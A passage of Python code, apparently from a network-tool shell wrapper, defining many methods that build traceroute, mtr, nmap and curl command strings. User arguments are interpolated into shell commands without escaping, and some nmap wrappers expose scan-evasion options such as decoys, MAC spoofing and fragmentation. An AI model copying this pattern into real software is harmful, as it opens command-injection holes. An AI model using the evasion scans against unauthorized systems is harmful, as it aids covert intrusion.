        return self._generic(f'traceroute -p {args[1]} {args[0]}')
    
    def _traceroute_numeric(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: traceroute_numeric <target>'}
        return self._generic(f'traceroute -n {args[0]}')
    
    def _traceroute_verbose(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: traceroute_verbose <target>'}
        return self._generic(f'traceroute -v {args[0]}')
    
    def _traceroute_debug(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: traceroute_debug <target>'}
        return self._generic(f'traceroute -d {args[0]}')
    
    def _traceroute_dont_fragment(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: traceroute_dont_fragment <target>'}
        return self._generic(f'traceroute -F {args[0]}')
    
    def _traceroute_interface(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: traceroute_interface <target> <interface>'}
        return self._generic(f'traceroute -i {args[1]} {args[0]}')
    
    def _traceroute_source(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: traceroute_source <target> <source_ip>'}
        return self._generic(f'traceroute -s {args[1]} {args[0]}')
    
    def _traceroute_tos(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: traceroute_tos <target> <tos>'}
        return self._generic(f'traceroute -t {args[1]} {args[0]}')
    
    def _traceroute_as_lookup(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: traceroute_as_lookup <target>'}
        return self._generic(f'traceroute -A {args[0]}')
    
    def _mtr(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: mtr <target>'}
        return self._generic(f'mtr {args[0]}')
    
    def _mtr_report(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: mtr_report <target>'}
        return self._generic(f'mtr --report {args[0]}')
    
    def _mtr_json(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: mtr_json <target>'}
        return self._generic(f'mtr --json {args[0]}')
    
    def _mtr_csv(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: mtr_csv <target>'}
        return self._generic(f'mtr --csv {args[0]}')
    
    def _mtr_xml(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: mtr_xml <target>'}
        return self._generic(f'mtr --xml {args[0]}')
    
    def _mtr_raw(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: mtr_raw <target>'}
        return self._generic(f'mtr --raw {args[0]}')
    
    def _tcptraceroute(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: tcptraceroute <target>'}
        return self._generic(f'tcptraceroute {args[0]}')
    
    def _lft(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: lft <target>'}
        return self._generic(f'lft {args[0]}')
    
    # ==================== Nmap Commands ====================
    
    def _nmap(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap <target> [type]'}
        target = args[0]
        scan_type = args[1] if len(args) > 1 else 'quick'
        result = self.tools.nmap(target, scan_type)
        return {'success': result.success, 'output': result.output}
    
    def _nmap_quick(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap_quick <target>'}
        result = self.tools.nmap(args[0], 'quick')
        return {'success': result.success, 'output': result.output}
    
    def _nmap_full(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap_full <target>'}
        result = self.tools.nmap(args[0], 'full')
        return {'success': result.success, 'output': result.output}
    
    def _nmap_os(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap_os <target>'}
        result = self.tools.nmap(args[0], 'os')
        return {'success': result.success, 'output': result.output}
    
    def _nmap_service(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap_service <target>'}
        result = self.tools.nmap(args[0], 'service')
        return {'success': result.success, 'output': result.output}
    
    def _nmap_udp(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap_udp <target>'}
        result = self.tools.nmap(args[0], 'udp')
        return {'success': result.success, 'output': result.output}
    
    def _nmap_vuln(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap_vuln <target>'}
        result = self.tools.nmap(args[0], 'vuln')
        return {'success': result.success, 'output': result.output}
    
    def _nmap_stealth(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap_stealth <target>'}
        result = self.tools.nmap(args[0], 'stealth')
        return {'success': result.success, 'output': result.output}
    
    def _nmap_ping(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap_ping <target>'}
        result = self.tools.nmap(args[0], 'ping')
        return {'success': result.success, 'output': result.output}
    
    def _nmap_ports(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: nmap_ports <target> <ports>'}
        return self._generic(f'nmap -p {args[1]} {args[0]}')
    
    def _nmap_script(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: nmap_script <target> <script>'}
        return self._generic(f'nmap --script {args[1]} {args[0]}')
    
    def _nmap_aggressive(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap_aggressive <target>'}
        result = self.tools.nmap(args[0], 'aggressive')
        return {'success': result.success, 'output': result.output}
    
    def _nmap_traceroute(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap_traceroute <target>'}
        return self._generic(f'nmap --traceroute {args[0]}')
    
    def _nmap_output(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: nmap_output <target> <file>'}
        return self._generic(f'nmap -oN {args[1]} {args[0]}')
    
    def _nmap_exclude(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: nmap_exclude <target> <exclude>'}
        return self._generic(f'nmap --exclude {args[1]} {args[0]}')
    
    def _nmap_exclude_file(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: nmap_exclude_file <target> <file>'}
        return self._generic(f'nmap --excludefile {args[1]} {args[0]}')
    
    def _nmap_input(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap_input <file>'}
        return self._generic(f'nmap -iL {args[0]}')
    
    def _nmap_random(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap_random <count>'}
        return self._generic(f'nmap -iR {args[0]}')
    
    def _nmap_timing(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: nmap_timing <target> <level>'}
        return self._generic(f'nmap -T{args[1]} {args[0]}')
    
    def _nmap_version(self, args: List[str]) -> Dict:
        return self._generic('nmap -V')
    
    def _nmap_help(self, args: List[str]) -> Dict:
        return self._generic('nmap --help')
    
    def _nmap_syn(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap_syn <target>'}
        return self._generic(f'nmap -sS {args[0]}')
    
    def _nmap_connect(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap_connect <target>'}
        return self._generic(f'nmap -sT {args[0]}')
    
    def _nmap_ack(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap_ack <target>'}
        return self._generic(f'nmap -sA {args[0]}')
    
    def _nmap_fin(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap_fin <target>'}
        return self._generic(f'nmap -sF {args[0]}')
    
    def _nmap_xmas(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap_xmas <target>'}
        return self._generic(f'nmap -sX {args[0]}')
    
    def _nmap_null(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap_null <target>'}
        return self._generic(f'nmap -sN {args[0]}')
    
    def _nmap_script_default(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap_script_default <target>'}
        return self._generic(f'nmap -sC {args[0]}')
    
    def _nmap_top_ports(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: nmap_top_ports <target> <count>'}
        return self._generic(f'nmap --top-ports {args[1]} {args[0]}')
    
    def _nmap_open(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap_open <target>'}
        return self._generic(f'nmap --open {args[0]}')
    
    def _nmap_reason(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap_reason <target>'}
        return self._generic(f'nmap --reason {args[0]}')
    
    def _nmap_packet_trace(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap_packet_trace <target>'}
        return self._generic(f'nmap --packet-trace {args[0]}')
    
    def _nmap_iflist(self, args: List[str]) -> Dict:
        return self._generic('nmap --iflist')
    
    def _nmap_no_ping(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap_no_ping <target>'}
        return self._generic(f'nmap -Pn {args[0]}')
    
    def _nmap_fast(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap_fast <target>'}
        return self._generic(f'nmap -F {args[0]}')
    
    def _nmap_fragment(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap_fragment <target>'}
        return self._generic(f'nmap -f {args[0]}')
    
    def _nmap_decoys(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: nmap_decoys <target> <count>'}
        return self._generic(f'nmap -D RND:{args[1]} {args[0]}')
    
    def _nmap_source_port(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: nmap_source_port <target> <port>'}
        return self._generic(f'nmap -g {args[1]} {args[0]}')
    
    def _nmap_data_length(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: nmap_data_length <target> <length>'}
        return self._generic(f'nmap --data-length {args[1]} {args[0]}')
    
    def _nmap_ttl(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: nmap_ttl <target> <ttl>'}
        return self._generic(f'nmap --ttl {args[1]} {args[0]}')
    
    def _nmap_spoof_mac(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: nmap_spoof_mac <target> <mac>'}
        return self._generic(f'nmap --spoof-mac {args[1]} {args[0]}')
    
    def _nmap_badsum(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap_badsum <target>'}
        return self._generic(f'nmap --badsum {args[0]}')
    
    def _nmap_send_eth(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap_send_eth <target>'}
        return self._generic(f'nmap --send-eth {args[0]}')
    
    def _nmap_send_ip(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap_send_ip <target>'}
        return self._generic(f'nmap --send-ip {args[0]}')
    
    def _nmap_privileged(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap_privileged <target>'}
        return self._generic(f'nmap --privileged {args[0]}')
    
    def _nmap_unprivileged(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap_unprivileged <target>'}
        return self._generic(f'nmap --unprivileged {args[0]}')
    
    def _nmap_release_memory(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap_release_memory <target>'}
        return self._generic(f'nmap --release-memory {args[0]}')
    
    def _nmap_version_intensity(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: nmap_version_intensity <target> <intensity>'}
        return self._generic(f'nmap --version-intensity {args[1]} {args[0]}')
    
    def _nmap_version_light(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap_version_light <target>'}
        return self._generic(f'nmap --version-light {args[0]}')
    
    def _nmap_version_all(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap_version_all <target>'}
        return self._generic(f'nmap --version-all {args[0]}')
    
    def _nmap_osscan_limit(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap_osscan_limit <target>'}
        return self._generic(f'nmap --osscan-limit {args[0]}')
    
    def _nmap_osscan_guess(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap_osscan_guess <target>'}
        return self._generic(f'nmap --osscan-guess {args[0]}')
    
    def _nmap_max_os_tries(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: nmap_max_os_tries <target> <tries>'}
        return self._generic(f'nmap --max-os-tries {args[1]} {args[0]}')
    
    def _nmap_max_retries(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: nmap_max_retries <target> <retries>'}
        return self._generic(f'nmap --max-retries {args[1]} {args[0]}')
    
    def _nmap_host_timeout(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: nmap_host_timeout <target> <timeout>'}
        return self._generic(f'nmap --host-timeout {args[1]} {args[0]}')
    
    def _nmap_scan_delay(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: nmap_scan_delay <target> <delay>'}
        return self._generic(f'nmap --scan-delay {args[1]} {args[0]}')
    
    def _nmap_max_scan_delay(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: nmap_max_scan_delay <target> <delay>'}
        return self._generic(f'nmap --max-scan-delay {args[1]} {args[0]}')
    
    def _nmap_min_rate(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: nmap_min_rate <target> <rate>'}
        return self._generic(f'nmap --min-rate {args[1]} {args[0]}')
    
    def _nmap_max_rate(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: nmap_max_rate <target> <rate>'}
        return self._generic(f'nmap --max-rate {args[1]} {args[0]}')
    
    def _nmap_min_parallelism(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: nmap_min_parallelism <target> <parallelism>'}
        return self._generic(f'nmap --min-parallelism {args[1]} {args[0]}')
    
    def _nmap_max_parallelism(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: nmap_max_parallelism <target> <parallelism>'}
        return self._generic(f'nmap --max-parallelism {args[1]} {args[0]}')
    
    def _nmap_defeat_rst_ratelimit(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap_defeat_rst_ratelimit <target>'}
        return self._generic(f'nmap --defeat-rst-ratelimit {args[0]}')
    
    def _nmap_defeat_icmp_ratelimit(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap_defeat_icmp_ratelimit <target>'}
        return self._generic(f'nmap --defeat-icmp-ratelimit {args[0]}')
    
    # ==================== Curl Commands ====================
    
    def _curl(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl <url>'}
        result = self.tools.curl(args[0])
        return {'success': result.success, 'output': result.output}
    
    def _curl_get(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl_get <url>'}
        return self._generic(f'curl -s {args[0]}')
    
    def _curl_post(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_post <url> <data>'}
        return self._generic(f'curl -s -X POST -d "{args[1]}" {args[0]}')
    
    def _curl_put(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_put <url> <data>'}
        return self._generic(f'curl -s -X PUT -d "{args[1]}" {args[0]}')
    
    def _curl_delete(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl_delete <url>'}
        return self._generic(f'curl -s -X DELETE {args[0]}')
    
    def _curl_patch(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_patch <url> <data>'}
        return self._generic(f'curl -s -X PATCH -d "{args[1]}" {args[0]}')
    
    def _curl_head(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl_head <url>'}
        return self._generic(f'curl -s -I {args[0]}')
    
    def _curl_options(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl_options <url>'}
        return self._generic(f'curl -s -X OPTIONS {args[0]}')
    
    def _curl_output(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_output <url> <file>'}
        return self._generic(f'curl -s -o {args[1]} {args[0]}')
    
    def _curl_remote_name(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl_remote_name <url>'}
        return self._generic(f'curl -s -O {args[0]}')
    
    def _curl_location(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl_location <url>'}
        return self._generic(f'curl -s -L {args[0]}')
    
    def _curl_include(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl_include <url>'}
        return self._generic(f'curl -s -i {args[0]}')
    
    def _curl_verbose(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl_verbose <url>'}
        return self._generic(f'curl -v {args[0]}')
    
    def _curl_silent(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl_silent <url>'}
        return self._generic(f'curl -s {args[0]}')
    
    def _curl_show_error(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl_show_error <url>'}
        return self._generic(f'curl -sS {args[0]}')
    
    def _curl_fail(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl_fail <url>'}
        return self._generic(f'curl -sf {args[0]}')
    
    def _curl_insecure(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl_insecure <url>'}
        return self._generic(f'curl -sk {args[0]}')
    
    def _curl_data(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_data <url> <data>'}
        return self._generic(f'curl -s -d "{args[1]}" {args[0]}')
    
    def _curl_data_binary(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_data_binary <url> <file>'}
        return self._generic(f'curl -s --data-binary @{args[1]} {args[0]}')
    
    def _curl_data_urlencode(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_data_urlencode <url> <data>'}
        return self._generic(f'curl -s --data-urlencode "{args[1]}" {args[0]}')
    
    def _curl_data_raw(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_data_raw <url> <data>'}
        return self._generic(f'curl -s --data-raw "{args[1]}" {args[0]}')
    
    def _curl_form(self, args: List[str]) -> Dict:
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: curl_form <url> <name> <value>'}
        return self._generic(f'curl -s -F "{args[1]}={args[2]}" {args[0]}')
    
    def _curl_header(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_header <url> <header>'}
        return self._generic(f'curl -s -H "{args[1]}" {args[0]}')
    
    def _curl_user_agent(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_user_agent <url> <agent>'}
        return self._generic(f'curl -s -A "{args[1]}" {args[0]}')
    
    def _curl_referer(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_referer <url> <referer>'}
        return self._generic(f'curl -s -e "{args[1]}" {args[0]}')
    
    def _curl_user(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_user <url> <user:pass>'}
        return self._generic(f'curl -s -u "{args[1]}" {args[0]}')
    
    def _curl_basic(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_basic <url> <user:pass>'}
        return self._generic(f'curl -s --basic -u "{args[1]}" {args[0]}')
    
    def _curl_digest(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_digest <url> <user:pass>'}
        return self._generic(f'curl -s --digest -u "{args[1]}" {args[0]}')
    
    def _curl_ntlm(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_ntlm <url> <user:pass>'}
        return self._generic(f'curl -s --ntlm -u "{args[1]}" {args[0]}')
    
    def _curl_negotiate(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_negotiate <url> <user:pass>'}
        return self._generic(f'curl -s --negotiate -u "{args[1]}" {args[0]}')
    
    def _curl_cookie(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_cookie <url> <cookie>'}
        return self._generic(f'curl -s -b "{args[1]}" {args[0]}')
    
    def _curl_cookie_jar(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_cookie_jar <url> <file>'}
        return self._generic(f'curl -s -c {args[1]} {args[0]}')
    
    def _curl_proxy(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_proxy <url> <proxy>'}
        return self._generic(f'curl -s -x {args[1]} {args[0]}')
    
    def _curl_proxy_user(self, args: List[str]) -> Dict:
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: curl_proxy_user <url> <proxy> <user:pass>'}
        return self._generic(f'curl -s -x {args[1]} --proxy-user "{args[2]}" {args[0]}')
    
    def _curl_noproxy(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_noproxy <url> <hosts>'}
        return self._generic(f'curl -s --noproxy "{args[1]}" {args[0]}')
    
    def _curl_cert(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_cert <url> <cert>'}
        return self._generic(f'curl -s -E {args[1]} {args[0]}')
    
    def _curl_key(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_key <url> <key>'}
        return self._generic(f'curl -s --key {args[1]} {args[0]}')
    
    def _curl_cacert(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_cacert <url> <ca>'}
        return self._generic(f'curl -s --cacert {args[1]} {args[0]}')
    
    def _curl_capath(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_capath <url> <path>'}
        return self._generic(f'curl -s --capath {args[1]} {args[0]}')
    
    def _curl_ciphers(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_ciphers <url> <ciphers>'}
        return self._generic(f'curl -s --ciphers {args[1]} {args[0]}')
    
    def _curl_tlsv1_2(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl_tlsv1_2 <url>'}
        return self._generic(f'curl -s --tlsv1.2 {args[0]}')
    
    def _curl_tlsv1_3(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl_tlsv1_3 <url>'}
        return self._generic(f'curl -s --tlsv1.3 {args[0]}')
    
    def _curl_continue(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl_continue <url>'}
        return self._generic(f'curl -s -C - {args[0]}')
    
    def _curl_range(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_range <url> <range>'}
        return self._generic(f'curl -s -r {args[1]} {args[0]}')
    
    def _curl_limit_rate(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_limit_rate <url> <rate>'}
        return self._generic(f'curl -s --limit-rate {args[1]} {args[0]}')
    
    def _curl_max_filesize(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_max_filesize <url> <size>'}
        return self._generic(f'curl -s --max-filesize {args[1]} {args[0]}')
    
    def _curl_max_time(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_max_time <url> <seconds>'}
        return self._generic(f'curl -s -m {args[1]} {args[0]}')
    
    def _curl_connect_timeout(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_connect_timeout <url> <seconds>'}
        return self._generic(f'curl -s --connect-timeout {args[1]} {args[0]}')
    
    def _curl_retry(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_retry <url> <count>'}
        return self._generic(f'curl -s --retry {args[1]} {args[0]}')
    
    def _curl_retry_delay(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_retry_delay <url> <seconds>'}
        return self._generic(f'curl -s --retry-delay {args[1]} {args[0]}')
    
    def _curl_retry_max_time(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_retry_max_time <url> <seconds>'}
        return self._generic(f'curl -s --retry-max-time {args[1]} {args[0]}')
    
    def _curl_retry_connrefused(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl_retry_connrefused <url>'}
        return self._generic(f'curl -s --retry-connrefused {args[0]}')
    
    def _curl_ipv4(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl_ipv4 <url>'}
        return self._generic(f'curl -s -4 {args[0]}')
    
    def _curl_ipv6(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl_ipv6 <url>'}
        return self._generic(f'curl -s -6 {args[0]}')
    
    def _curl_interface(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_interface <url> <interface>'}
        return self._generic(f'curl -s --interface {args[1]} {args[0]}')
    
    def _curl_local_port(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_local_port <url> <port>'}
        return self._generic(f'curl -s --local-port {args[1]} {args[0]}')
    
    def _curl_dns_servers(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_dns_servers <url> <servers>'}
        return self._generic(f'curl -s --dns-servers {args[1]} {args[0]}')
    
    def _curl_resolve(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_resolve <url> <host:port:addr>'}
        return self._generic(f'curl -s --resolve {args[1]} {args[0]}')
    
    def _curl_connect_to(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_connect_to <url> <host:port:addr>'}
        return self._generic(f'curl -s --connect-to {args[1]} {args[0]}')
    
    def _curl_unix_socket(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_unix_socket <url> <socket>'}
        return self._generic(f'curl -s --unix-socket {args[1]} {args[0]}')
    
    def _curl_http2(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl_http2 <url>'}
        return self._generic(f'curl -s --http2 {args[0]}')
    
    def _curl_http3(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl_http3 <url>'}
        return self._generic(f'curl -s --http3 {args[0]}')
    
    def _curl_compressed(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl_compressed <url>'}
        return self._generic(f'curl -s --compressed {args[0]}')
    
    def _curl_raw(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl_raw <url>'}
        return self._generic(f'curl -s --raw {args[0]}')
    
    def _curl_write_out(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_write_out <url> <format>'}
        return self._generic(f'curl -s -w "{args[1]}" -o /dev/null {args[0]}')
    
    def _curl_dump_header(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_dump_header <url> <file>'}
        return self._generic(f'curl -s -D {args[1]} {args[0]}')
    
    def _curl_trace(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_trace <url> <file>'}
        return self._generic(f'curl -s --trace {args[1]} {args[0]}')
    
    def _curl_trace_ascii(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_trace_ascii <url> <file>'}
        return self._generic(f'curl -s --trace-ascii {args[1]} {args[0]}')
    
    def _curl_json(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_json <url> <json>'}
        return self._generic(f'curl -s -H "Content-Type: application/json" -d \'{args[1]}\' {args[0]}')
    
    def _curl_help(self, args: List[str]) -> Dict:
        return self._generic('curl --help')
    
    def _curl_version(self, args: List[str]) -> Dict:
        return self._generic('curl --version')
    
    def _curl_parallel(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_parallel <url1> <url2>'}
        return self._generic(f'curl -s -Z "{args[0]}" "{args[1]}"')
    
    def _curl_config(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl_config <config_file>'}
        return self._generic(f'curl -s -K {args[0]}')
    
    def _curl_next(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_next <url1> <url2>'}
        return self._generic(f'curl -s {args[0]} --next {args[1]}')
    
